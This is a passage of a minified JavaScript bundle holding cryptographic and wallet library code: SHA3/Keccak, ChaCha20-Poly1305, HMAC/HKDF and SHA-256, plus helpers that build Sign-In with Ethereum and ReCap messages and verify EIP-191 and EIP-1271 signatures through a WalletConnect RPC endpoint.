this._cloneInto()}};function k_(t){const e=r=>t().update(Ra(r)).digest(),n=t();return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=()=>t(),e}function Za(t=32){if(Go&&typeof Go.getRandomValues=="function")return Go.getRandomValues(new Uint8Array(t));if(Go&&typeof Go.randomBytes=="function")return Go.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}const B_=[],L_=[],j_=[],u5=BigInt(0),Ql=BigInt(1),h5=BigInt(2),f5=BigInt(7),d5=BigInt(256),p5=BigInt(113);for(let t=0,e=Ql,n=1,r=0;t<24;t++){[n,r]=[r,(2*n+3*r)%5],B_.push(2*(5*r+n)),L_.push((t+1)*(t+2)/2%64);let i=u5;for(let o=0;o<7;o++)e=(e<<Ql^(e>>f5)*p5)%d5,e&h5&&(i^=Ql<<(Ql<<BigInt(o))-Ql);j_.push(i)}const[g5,y5]=t5(j_,!0),uE=(t,e,n)=>n>32?i5(t,e,n):n5(t,e,n),hE=(t,e,n)=>n>32?s5(t,e,n):r5(t,e,n);function m5(t,e=24){const n=new Uint32Array(10);for(let r=24-e;r<24;r++){for(let l=0;l<10;l++)n[l]=t[l]^t[l+10]^t[l+20]^t[l+30]^t[l+40];for(let l=0;l<10;l+=2){const c=(l+8)%10,u=(l+2)%10,f=n[u],d=n[u+1],y=uE(f,d,1)^n[c],g=hE(f,d,1)^n[c+1];for(let E=0;E<50;E+=10)t[l+E]^=y,t[l+E+1]^=g}let i=t[2],o=t[3];for(let l=0;l<24;l++){const c=L_[l],u=uE(i,o,c),f=hE(i,o,c),d=B_[l];i=t[d],o=t[d+1],t[d]=u,t[d+1]=f}for(let l=0;l<50;l+=10){for(let c=0;c<10;c++)n[c]=t[l+c];for(let c=0;c<10;c++)t[l+c]^=~n[(c+2)%10]&n[(c+4)%10]}t[0]^=g5[r],t[1]^=y5[r]}n.fill(0)}let w5=class U_ extends nw{constructor(e,n,r,i=!1,o=24){if(super(),this.blockLen=e,this.suffix=n,this.outputLen=r,this.enableXOF=i,this.rounds=o,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,xc(r),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=o5(this.state)}keccak(){lE||cE(this.state32),m5(this.state32,this.rounds),lE||cE(this.state32),this.posOut=0,this.pos=0}update(e){Ca(this);const{blockLen:n,state:r}=this;e=Ra(e);const i=e.length;for(let o=0;o<i;){const l=Math.min(n-this.pos,i-o);for(let c=0;c<l;c++)r[this.pos++]^=e[o++];this.pos===n&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:n,pos:r,blockLen:i}=this;e[r]^=n,(n&128)!==0&&r===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){Ca(this,!1),zc(e),this.finish();const n=this.state,{blockLen:r}=this;for(let i=0,o=e.length;i<o;){this.posOut>=r&&this.keccak();const l=Math.min(r-this.posOut,o-i);e.set(n.subarray(this.posOut,this.posOut+l),i),this.posOut+=l,i+=l}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return xc(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(N_(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:n,suffix:r,outputLen:i,rounds:o,enableXOF:l}=this;return e||(e=new U_(n,r,i,l,o)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=o,e.suffix=r,e.outputLen=i,e.enableXOF=l,e.destroyed=this.destroyed,e}};const v5=(t,e,n)=>k_(()=>new w5(e,t,n)),b5=v5(1,136,256/8),E5="https://rpc.walletconnect.org/v1";function M_(t){const e=`Ethereum Signed Message:
${t.length}`,n=new TextEncoder().encode(e+t);return"0x"+Buffer.from(b5(n)).toString("hex")}async function x5(t,e,n,r,i,o){switch(n.t){case"eip191":return await S5(t,e,n.s);case"eip1271":return await _5(t,e,n.s,r,i,o);default:throw new Error(`verifySignature failed: Attempted to verify CacaoSignature with unknown type: ${n.t}`)}}async function S5(t,e,n){return(await EB({hash:M_(e),signature:n})).toLowerCase()===t.toLowerCase()}async function _5(t,e,n,r,i,o){const l=zh(r);if(!l.namespace||!l.reference)throw new Error(`isValidEip1271Signature failed: chainId must be in CAIP-2 format, received: ${r}`);try{const c="0x1626ba7e",u="0000000000000000000000000000000000000000000000000000000000000040",f="0000000000000000000000000000000000000000000000000000000000000041",d=n.substring(2),y=M_(e).substring(2),g=c+y+u+f+d,E=await fetch(`${o||E5}/?chainId=${r}&projectId=${i}`,{method:"POST",body:JSON.stringify({id:I5(),jsonrpc:"2.0",method:"eth_call",params:[{to:t,data:g},"latest"]})}),{result:w}=await E.json();return w?w.slice(0,c.length).toLowerCase()===c.toLowerCase():!1}catch(c){return console.error("isValidEip1271Signature: ",c),!1}}function I5(){return Date.now()+Math.floor(Math.random()*1e3)}function O5(t){const e=atob(t),n=new Uint8Array(e.length);for(let l=0;l<e.length;l++)n[l]=e.charCodeAt(l);const r=n[0];if(r===0)throw new Error("No signatures found");const i=1+r*64;if(n.length<i)throw new Error("Transaction data too short for claimed signature count");if(n.length<100)throw new Error("Transaction too short");const o=Buffer.from(t,"base64").slice(1,65);return _B.encode(o)}var $5=Object.defineProperty,P5=Object.defineProperties,T5=Object.getOwnPropertyDescriptors,fE=Object.getOwnPropertySymbols,A5=Object.prototype.hasOwnProperty,C5=Object.prototype.propertyIsEnumerable,dE=(t,e,n)=>e in t?$5(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,R5=(t,e)=>{for(var n in e||(e={}))A5.call(e,n)&&dE(t,n,e[n]);if(fE)for(var n of fE(e))C5.call(e,n)&&dE(t,n,e[n]);return t},D5=(t,e)=>P5(t,T5(e));const N5="did:pkh:",rw=t=>t==null?void 0:t.split(":"),k5=t=>{const e=t&&rw(t);if(e)return t.includes(N5)?e[3]:e[1]},Ly=t=>{const e=t&&rw(t);if(e)return e[2]+":"+e[3]},af=t=>{const e=t&&rw(t);if(e)return e.pop()};async function pE(t){const{cacao:e,projectId:n}=t,{s:r,p:i}=e,o=F_(i,i.iss),l=af(i.iss);return await x5(l,o,r,Ly(i.iss),n)}const F_=(t,e)=>{const n=`${t.domain} wants you to sign in with your Ethereum account:`,r=af(e);if(!t.aud&&!t.uri)throw new Error("Either `aud` or `uri` is required to construct the message");let i=t.statement||void 0;const o=`URI: ${t.aud||t.uri}`,l=`Version: ${t.version}`,c=`Chain ID: ${k5(e)}`,u=`Nonce: ${t.nonce}`,f=`Issued At: ${t.iat}`,d=t.exp?`Expiration Time: ${t.exp}`:void 0,y=t.nbf?`Not Before: ${t.nbf}`:void 0,g=t.requestId?`Request ID: ${t.requestId}`:void 0,E=t.resources?`Resources:${t.resources.map(b=>`
- ${b}`).join("")}`:void 0,w=qh(t.resources);if(w){const b=Sc(w);i=H5(i,b)}return[n,r,"",i,"",o,l,c,u,f,d,y,g,E].filter(b=>b!=null).join(`
`)};function B5(t){return Buffer.from(JSON.stringify(t)).toString("base64")}function L5(t){return JSON.parse(Buffer.from(t,"base64").toString("utf-8"))}function so(t){if(!t)throw new Error("No recap provided, value is undefined");if(!t.att)throw new Error("No `att` property found");const e=Object.keys(t.att);if(!(e!=null&&e.length))throw new Error("No resources found in `att` property");e.forEach(n=>{const r=t.att[n];if(Array.isArray(r))throw new Error(`Resource must be an object: ${n}`);if(typeof r!="object")throw new Error(`Resource must be an object: ${n}`);if(!Object.keys(r).length)throw new Error(`Resource object is empty: ${n}`);Object.keys(r).forEach(i=>{const o=r[i];if(!Array.isArray(o))throw new Error(`Ability limits ${i} must be an array of objects, found: ${o}`);if(!o.length)throw new Error(`Value of ${i} is empty array, must be an array with objects`);o.forEach(l=>{if(typeof l!="object")throw new Error(`Ability limits (${i}) must be an array of objects, found: ${l}`)})})})}function j5(t,e,n,r={}){return n==null||n.sort((i,o)=>i.localeCompare(o)),{att:{[t]:U5(e,n,r)}}}function U5(t,e,n={}){e=e==null?void 0:e.sort((i,o)=>i.localeCompare(o));const r=e.map(i=>({[`${t}/${i}`]:[n]}));return Object.assign({},...r)}function z_(t){return so(t),`urn:recap:${B5(t).replace(/=/g,"")}`}function Sc(t){const e=L5(t.replace("urn:recap:",""));return so(e),e}function M5(t,e,n){const r=j5(t,e,n);return z_(r)}function F5(t){return t&&t.includes("urn:recap:")}function z5(t,e){const n=Sc(t),r=Sc(e),i=q5(n,r);return z_(i)}function q5(t,e){so(t),so(e);const n=Object.keys(t.att).concat(Object.keys(e.att)).sort((i,o)=>i.localeCompare(o)),r={att:{}};return n.forEach(i=>{var o,l;Object.keys(((o=t.att)==null?void 0:o[i])||{}).concat(Object.keys(((l=e.att)==null?void 0:l[i])||{})).sort((c,u)=>c.localeCompare(u)).forEach(c=>{var u,f;r.att[i]=D5(R5({},r.att[i]),{[c]:((u=t.att[i])==null?void 0:u[c])||((f=e.att[i])==null?void 0:f[c])})})}),r}function H5(t="",e){so(e);const n="I further authorize the stated URI to perform the following actions on my behalf: ";if(t.includes(n))return t;const r=[];let i=0;Object.keys(e.att).forEach(c=>{const u=Object.keys(e.att[c]).map(y=>({ability:y.split("/")[0],action:y.split("/")[1]}));u.sort((y,g)=>y.action.localeCompare(g.action));const f={};u.forEach(y=>{f[y.ability]||(f[y.ability]=[]),f[y.ability].push(y.action)});const d=Object.keys(f).map(y=>(i++,`(${i}) '${y}': '${f[y].join("', '")}' for '${c}'.`));r.push(d.join(", ").replace(".,","."))});const o=r.join(" "),l=`${n}${o}`;return`${t?t+" ":""}${l}`}function gE(t){var e;const n=Sc(t);so(n);const r=(e=n.att)==null?void 0:e.eip155;return r?Object.keys(r).map(i=>i.split("/")[1]):[]}function yE(t){const e=Sc(t);so(e);const n=[];return Object.values(e.att).forEach(r=>{Object.values(r).forEach(i=>{var o;(o=i==null?void 0:i[0])!=null&&o.chains&&n.push(i[0].chains)})}),[...new Set(n.flat())]}function qh(t){if(!t)return;const e=t==null?void 0:t[t.length-1];return F5(e)?e:void 0}function Pg(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function q_(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Xn(t,...e){if(!q_(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function mE(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function V5(t,e){Xn(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}function wE(t){if(typeof t!="boolean")throw new Error(`boolean expected, not ${t}`)}const ws=t=>new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4)),W5=t=>new DataView(t.buffer,t.byteOffset,t.byteLength),K5=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;if(!K5)throw new Error("Non little-endian hardware is not supported");function G5(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}function jy(t){if(typeof t=="string")t=G5(t);else if(q_(t))t=Uy(t);else throw new Error("Uint8Array expected, got "+typeof t);return t}function Y5(t,e){if(e==null||typeof e!="object")throw new Error("options must be defined");return Object.assign(t,e)}function J5(t,e){if(t.length!==e.length)return!1;let n=0;for(let r=0;r<t.length;r++)n|=t[r]^e[r];return n===0}const Z5=(t,e)=>{function n(r,...i){if(Xn(r),t.nonceLength!==void 0){const f=i[0];if(!f)throw new Error("nonce / iv required");t.varSizeNonce?Xn(f):Xn(f,t.nonceLength)}const o=t.tagLength;o&&i[1]!==void 0&&Xn(i[1]);const l=e(r,...i),c=(f,d)=>{if(d!==void 0){if(f!==2)throw new Error("cipher output not supported");Xn(d)}};let u=!1;return{encrypt(f,d){if(u)throw new Error("cannot encrypt() twice with same key + nonce");return u=!0,Xn(f),c(l.encrypt.length,d),l.encrypt(f,d)},decrypt(f,d){if(Xn(f),o&&f.length<o)throw new Error("invalid ciphertext length: smaller than tagLength="+o);return c(l.decrypt.length,d),l.decrypt(f,d)}}}return Object.assign(n,t),n};function vE(t,e,n=!0){if(e===void 0)return new Uint8Array(t);if(e.length!==t)throw new Error("invalid output length, expected "+t+", got: "+e.length);if(n&&!Q5(e))throw new Error("invalid output, must be aligned");return e}function bE(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),o=BigInt(4294967295),l=Number(n>>i&o),c=Number(n&o);t.setUint32(e+4,l,r),t.setUint32(e+0,c,r)}function Q5(t){return t.byteOffset%4===0}function Uy(t){return Uint8Array.from(t)}function Da(...t){for(let e=0;e<t.length;e++)t[e].fill(0)}const H_=t=>Uint8Array.from(t.split("").map(e=>e.charCodeAt(0))),X5=H_("expand 16-byte k"),eL=H_("expand 32-byte k"),tL=ws(X5),nL=ws(eL);function Ve(t,e){return t<<e|t>>>32-e}function My(t){return t.byteOffset%4===0}const _h=64,rL=16,V_=2**32-1,EE=new Uint32Array;function iL(t,e,n,r,i,o,l,c){const u=i.length,f=new Uint8Array(_h),d=ws(f),y=My(i)&&My(o),g=y?ws(i):EE,E=y?ws(o):EE;for(let w=0;w<u;l++){if(t(e,n,r,d,l,c),l>=V_)throw new Error("arx: counter overflow");const b=Math.min(_h,u-w);if(y&&b===_h){const m=w/4;if(w%4!==0)throw new Error("arx: invalid block position");for(let x=0,S;x<rL;x++)S=m+x,E[S]=g[S]^d[x];w+=_h;continue}for(let m=0,x;m<b;m++)x=w+m,o[x]=i[x]^f[m];w+=b}}function sL(t,e){const{allowShortKeys:n,extendNonceFn:r,counterLength:i,counterRight:o,rounds:l}=Y5({allowShortKeys:!1,counterLength:8,counterRight:!1,rounds:20},e);if(typeof t!="function")throw new Error("core must be a function");return Pg(i),Pg(l),wE(o),wE(n),(c,u,f,d,y=0)=>{Xn(c),Xn(u),Xn(f);const g=f.length;if(d===void 0&&(d=new Uint8Array(g)),Xn(d),Pg(y),y<0||y>=V_)throw new Error("arx: counter overflow");if(d.length<g)throw new Error(`arx: output (${d.length}) is shorter than data (${g})`);const E=[];let w=c.length,b,m;if(w===32)E.push(b=Uy(c)),m=nL;else if(w===16&&n)b=new Uint8Array(32),b.set(c),b.set(c,16),m=tL,E.push(b);else throw new Error(`arx: invalid 32-byte key, got length=${w}`);My(u)||E.push(u=Uy(u));const x=ws(b);if(r){if(u.length!==24)throw new Error("arx: extended nonce must be 24 bytes");r(m,x,ws(u.subarray(0,16)),x),u=u.subarray(16)}const S=16-i;if(S!==u.length)throw new Error(`arx: nonce must be ${S} or 16 bytes`);if(S!==12){const $=new Uint8Array(12);$.set(u,o?0:12-u.length),u=$,E.push(u)}const O=ws(u);return iL(t,m,x,O,f,d,y,l),Da(...E),d}}const nn=(t,e)=>t[e++]&255|(t[e++]&255)<<8;let oL=class{constructor(e){this.blockLen=16,this.outputLen=16,this.buffer=new Uint8Array(16),this.r=new Uint16Array(10),this.h=new Uint16Array(10),this.pad=new Uint16Array(8),this.pos=0,this.finished=!1,e=jy(e),Xn(e,32);const n=nn(e,0),r=nn(e,2),i=nn(e,4),o=nn(e,6),l=nn(e,8),c=nn(e,10),u=nn(e,12),f=nn(e,14);this.r[0]=n&8191,this.r[1]=(n>>>13|r<<3)&8191,this.r[2]=(r>>>10|i<<6)&7939,this.r[3]=(i>>>7|o<<9)&8191,this.r[4]=(o>>>4|l<<12)&255,this.r[5]=l>>>1&8190,this.r[6]=(l>>>14|c<<2)&8191,this.r[7]=(c>>>11|u<<5)&8065,this.r[8]=(u>>>8|f<<8)&8191,this.r[9]=f>>>5&127;for(let d=0;d<8;d++)this.pad[d]=nn(e,16+2*d)}process(e,n,r=!1){const i=r?0:2048,{h:o,r:l}=this,c=l[0],u=l[1],f=l[2],d=l[3],y=l[4],g=l[5],E=l[6],w=l[7],b=l[8],m=l[9],x=nn(e,n+0),S=nn(e,n+2),O=nn(e,n+4),$=nn(e,n+6),R=nn(e,n+8),T=nn(e,n+10),D=nn(e,n+12),B=nn(e,n+14);let k=o[0]+(x&8191),G=o[1]+((x>>>13|S<<3)&8191),W=o[2]+((S>>>10|O<<6)&8191),J=o[3]+((O>>>7|$<<9)&8191),ne=o[4]+(($>>>4|R<<12)&8191),j=o[5]+(R>>>1&8191),A=o[6]+((R>>>14|T<<2)&8191),C=o[7]+((T>>>11|D<<5)&8191),U=o[8]+((D>>>8|B<<8)&8191),M=o[9]+(B>>>5|i),N=0,V=N+k*c+G*(5*m)+W*(5*b)+J*(5*w)+ne*(5*E);N=V>>>13,V&=8191,V+=j*(5*g)+A*(5*y)+C*(5*d)+U*(5*f)+M*(5*u),N+=V>>>13,V&=8191;let F=N+k*u+G*c+W*(5*m)+J*(5*b)+ne*(5*w);N=F>>>13,F&=8191,F+=j*(5*E)+A*(5*g)+C*(5*y)+U*(5*d)+M*(5*f),N+=F>>>13,F&=8191;let q=N+k*f+G*u+W*c+J*(5*m)+ne*(5*b);N=q>>>13,q&=8191,q+=j*(5*w)+A*(5*E)+C*(5*g)+U*(5*y)+M*(5*d),N+=q>>>13,q&=8191;let Q=N+k*d+G*f+W*u+J*c+ne*(5*m);N=Q>>>13,Q&=8191,Q+=j*(5*b)+A*(5*w)+C*(5*E)+U*(5*g)+M*(5*y),N+=Q>>>13,Q&=8191;let te=N+k*y+G*d+W*f+J*u+ne*c;N=te>>>13,te&=8191,te+=j*(5*m)+A*(5*b)+C*(5*w)+U*(5*E)+M*(5*g),N+=te>>>13,te&=8191;let se=N+k*g+G*y+W*d+J*f+ne*u;N=se>>>13,se&=8191,se+=j*c+A*(5*m)+C*(5*b)+U*(5*w)+M*(5*E),N+=se>>>13,se&=8191;let le=N+k*E+G*g+W*y+J*d+ne*f;N=le>>>13,le&=8191,le+=j*u+A*c+C*(5*m)+U*(5*b)+M*(5*w),N+=le>>>13,le&=8191;let pe=N+k*w+G*E+W*g+J*y+ne*d;N=pe>>>13,pe&=8191,pe+=j*f+A*u+C*c+U*(5*m)+M*(5*b),N+=pe>>>13,pe&=8191;let he=N+k*b+G*w+W*E+J*g+ne*y;N=he>>>13,he&=8191,he+=j*d+A*f+C*u+U*c+M*(5*m),N+=he>>>13,he&=8191;let fe=N+k*m+G*b+W*w+J*E+ne*g;N=fe>>>13,fe&=8191,fe+=j*y+A*d+C*f+U*u+M*c,N+=fe>>>13,fe&=8191,N=(N<<2)+N|0,N=N+V|0,V=N&8191,N=N>>>13,F+=N,o[0]=V,o[1]=F,o[2]=q,o[3]=Q,o[4]=te,o[5]=se,o[6]=le,o[7]=pe,o[8]=he,o[9]=fe}finalize(){const{h:e,pad:n}=this,r=new Uint16Array(10);let i=e[1]>>>13;e[1]&=8191;for(let c=2;c<10;c++)e[c]+=i,i=e[c]>>>13,e[c]&=8191;e[0]+=i*5,i=e[0]>>>13,e[0]&=8191,e[1]+=i,i=e[1]>>>13,e[1]&=8191,e[2]+=i,r[0]=e[0]+5,i=r[0]>>>13,r[0]&=8191;for(let c=1;c<10;c++)r[c]=e[c]+i,i=r[c]>>>13,r[c]&=8191;r[9]-=8192;let o=(i^1)-1;for(let c=0;c<10;c++)r[c]&=o;o=~o;for(let c=0;c<10;c++)e[c]=e[c]&o|r[c];e[0]=(e[0]|e[1]<<13)&65535,e[1]=(e[1]>>>3|e[2]<<10)&65535,e[2]=(e[2]>>>6|e[3]<<7)&65535,e[3]=(e[3]>>>9|e[4]<<4)&65535,e[4]=(e[4]>>>12|e[5]<<1|e[6]<<14)&65535,e[5]=(e[6]>>>2|e[7]<<11)&65535,e[6]=(e[7]>>>5|e[8]<<8)&65535,e[7]=(e[8]>>>8|e[9]<<5)&65535;let l=e[0]+n[0];e[0]=l&65535;for(let c=1;c<8;c++)l=(e[c]+n[c]|0)+(l>>>16)|0,e[c]=l&65535;Da(r)}update(e){mE(this);const{buffer:n,blockLen:r}=this;e=jy(e);const i=e.length;for(let o=0;o<i;){const l=Math.min(r-this.pos,i-o);if(l===r){for(;r<=i-o;o+=r)this.process(e,o);continue}n.set(e.subarray(o,o+l),this.pos),this.pos+=l,o+=l,this.pos===r&&(this.process(n,0,!1),this.pos=0)}return this}destroy(){Da(this.h,this.r,this.buffer,this.pad)}digestInto(e){mE(this),V5(e,this),this.finished=!0;const{buffer:n,h:r}=this;let{pos:i}=this;if(i){for(n[i++]=1;i<16;i++)n[i]=0;this.process(n,0,!0)}this.finalize();let o=0;for(let l=0;l<8;l++)e[o++]=r[l]>>>0,e[o++]=r[l]>>>8;return e}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}};function aL(t){const e=(r,i)=>t(i).update(jy(r)).digest(),n=t(new Uint8Array(32));return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=r=>t(r),e}const lL=aL(t=>new oL(t));function cL(t,e,n,r,i,o=20){let l=t[0],c=t[1],u=t[2],f=t[3],d=e[0],y=e[1],g=e[2],E=e[3],w=e[4],b=e[5],m=e[6],x=e[7],S=i,O=n[0],$=n[1],R=n[2],T=l,D=c,B=u,k=f,G=d,W=y,J=g,ne=E,j=w,A=b,C=m,U=x,M=S,N=O,V=$,F=R;for(let Q=0;Q<o;Q+=2)T=T+G|0,M=Ve(M^T,16),j=j+M|0,G=Ve(G^j,12),T=T+G|0,M=Ve(M^T,8),j=j+M|0,G=Ve(G^j,7),D=D+W|0,N=Ve(N^D,16),A=A+N|0,W=Ve(W^A,12),D=D+W|0,N=Ve(N^D,8),A=A+N|0,W=Ve(W^A,7),B=B+J|0,V=Ve(V^B,16),C=C+V|0,J=Ve(J^C,12),B=B+J|0,V=Ve(V^B,8),C=C+V|0,J=Ve(J^C,7),k=k+ne|0,F=Ve(F^k,16),U=U+F|0,ne=Ve(ne^U,12),k=k+ne|0,F=Ve(F^k,8),U=U+F|0,ne=Ve(ne^U,7),T=T+W|0,F=Ve(F^T,16),C=C+F|0,W=Ve(W^C,12),T=T+W|0,F=Ve(F^T,8),C=C+F|0,W=Ve(W^C,7),D=D+J|0,M=Ve(M^D,16),U=U+M|0,J=Ve(J^U,12),D=D+J|0,M=Ve(M^D,8),U=U+M|0,J=Ve(J^U,7),B=B+ne|0,N=Ve(N^B,16),j=j+N|0,ne=Ve(ne^j,12),B=B+ne|0,N=Ve(N^B,8),j=j+N|0,ne=Ve(ne^j,7),k=k+G|0,V=Ve(V^k,16),A=A+V|0,G=Ve(G^A,12),k=k+G|0,V=Ve(V^k,8),A=A+V|0,G=Ve(G^A,7);let q=0;r[q++]=l+T|0,r[q++]=c+D|0,r[q++]=u+B|0,r[q++]=f+k|0,r[q++]=d+G|0,r[q++]=y+W|0,r[q++]=g+J|0,r[q++]=E+ne|0,r[q++]=w+j|0,r[q++]=b+A|0,r[q++]=m+C|0,r[q++]=x+U|0,r[q++]=S+M|0,r[q++]=O+N|0,r[q++]=$+V|0,r[q++]=R+F|0}const uL=sL(cL,{counterRight:!1,counterLength:4,allowShortKeys:!1}),hL=new Uint8Array(16),xE=(t,e)=>{t.update(e);const n=e.length%16;n&&t.update(hL.subarray(n))},fL=new Uint8Array(32);function SE(t,e,n,r,i){const o=t(e,n,fL),l=lL.create(o);i&&xE(l,i),xE(l,r);const c=new Uint8Array(16),u=W5(c);bE(u,0,BigInt(i?i.length:0),!0),bE(u,8,BigInt(r.length),!0),l.update(c);const f=l.digest();return Da(o,c),f}const dL=t=>(e,n,r)=>({encrypt(i,o){const l=i.length;o=vE(l+16,o,!1),o.set(i);const c=o.subarray(0,-16);t(e,n,c,c,1);const u=SE(t,e,n,c,r);return o.set(u,l),Da(u),o},decrypt(i,o){o=vE(i.length-16,o,!1);const l=i.subarray(0,-16),c=i.subarray(-16),u=SE(t,e,n,l,r);if(!J5(c,u))throw new Error("invalid tag");return o.set(i.subarray(0,-16)),t(e,n,o,o,1),Da(u),o}}),W_=Z5({blockSize:64,nonceLength:12,tagLength:16},dL(uL));let K_=class extends nw{constructor(e,n){super(),this.finished=!1,this.destroyed=!1,tw(e);const r=Ra(n);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const i=this.blockLen,o=new Uint8Array(i);o.set(r.length>i?e.create().update(r).digest():r);for(let l=0;l<o.length;l++)o[l]^=54;this.iHash.update(o),this.oHash=e.create();for(let l=0;l<o.length;l++)o[l]^=106;this.oHash.update(o),o.fill(0)}update(e){return Ca(this),this.iHash.update(e),this}digestInto(e){Ca(this),zc(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:n,iHash:r,finished:i,destroyed:o,blockLen:l,outputLen:c}=this;return e=e,e.finished=i,e.destroyed=o,e.blockLen=l,e.outputLen=c,e.oHash=n._cloneInto(e.oHash),e.iHash=r._cloneInto(e.iHash),e}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}};const Rf=(t,e,n)=>new K_(t,e).update(n).digest();Rf.create=(t,e)=>new K_(t,e);function pL(t,e,n){return tw(t),n===void 0&&(n=new Uint8Array(t.outputLen)),Rf(t,Ra(n),Ra(e))}const Tg=new Uint8Array([0]),_E=new Uint8Array;function gL(t,e,n,r=32){if(tw(t),xc(r),r>255*t.outputLen)throw new Error("Length should be <= 255*HashLen");const i=Math.ceil(r/t.outputLen);n===void 0&&(n=_E);const o=new Uint8Array(i*t.outputLen),l=Rf.create(t,e),c=l._cloneInto(),u=new Uint8Array(l.outputLen);for(let f=0;f<i;f++)Tg[0]=f+1,c.update(f===0?_E:u).update(n).update(Tg).digestInto(u),o.set(u,t.outputLen*f),l._cloneInto(c);return l.destroy(),c.destroy(),u.fill(0),Tg.fill(0),o.slice(0,r)}const yL=(t,e,n,r,i)=>gL(t,pL(t,e,n),r,i);function mL(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),o=BigInt(4294967295),l=Number(n>>i&o),c=Number(n&o),u=r?4:0,f=r?0:4;t.setUint32(e+u,l,r),t.setUint32(e+f,c,r)}function wL(t,e,n){return t&e^~t&n}function vL(t,e,n){return t&e^t&n^e&n}let bL=class extends nw{constructor(e,n,r,i){super(),this.blockLen=e,this.outputLen=n,this.padOffset=r,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=$g(this.buffer)}update(e){Ca(this);const{view:n,buffer:r,blockLen:i}=this;e=Ra(e);const o=e.length;for(let l=0;l<o;){const c=Math.min(i-this.pos,o-l);if(c===i){const u=$g(e);for(;i<=o-l;l+=i)this.process(u,l);continue}r.set(e.subarray(l,l+c),this.pos),this.pos+=c,l+=c,this.pos===i&&(this.process(n,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Ca(this),N_(e,this),this.finished=!0;const{buffer:n,view:r,blockLen:i,isLE:o}=this;let{pos:l}=this;n[l++]=128,this.buffer.subarray(l).fill(0),this.padOffset>i-l&&(this.process(r,0),l=0);for(let y=l;y<i;y++)n[y]=0;mL(r,i-8,BigInt(this.length*8),o),this.process(r,0);const c=$g(e),u=this.outputLen;if(u%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const f=u/4,d=this.get();if(f>d.length)throw new Error("_sha2: outputLen bigger than state");for(let y=0;y<f;y++)c.setUint32(4*y,d[y],o)}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:n,buffer:r,length:i,finished:o,destroyed:l,pos:c}=this;return e.length=i,e.pos=c,e.finished=o,e.destroyed=l,i%n&&e.buffer.set(r),e}};const EL=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),ls=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),cs=new Uint32Array(64);let xL=class extends bL{constructor(){super(64,32,8,!1),this.A=ls[0]|0,this.B=ls[1]|0,this.C=ls[2]|0,this.D=ls[3]|0,this.E=ls[4]|0,this.F=ls[5]|0,this.G=ls[6]|0,this.H=ls[7]|0}get(){const{A:e,B:n,C:r,D:i,E:o,F:l,G:c,H:u}=this;return[e,n,r,i,o,l,c,u]}set(e,n,r,i,o,l,c,u){this.A=e|0,this.B=n|0,this.C=r|0,this.D=i|0,this.E=o|0,this.F=l|0,this.G=c|0,this.H=u|0}process(e,n){for(let y=0;y<16;y++,n+=4)cs[y]=e.getUint32(n,!1);for(let y=16;y<64;y++){const 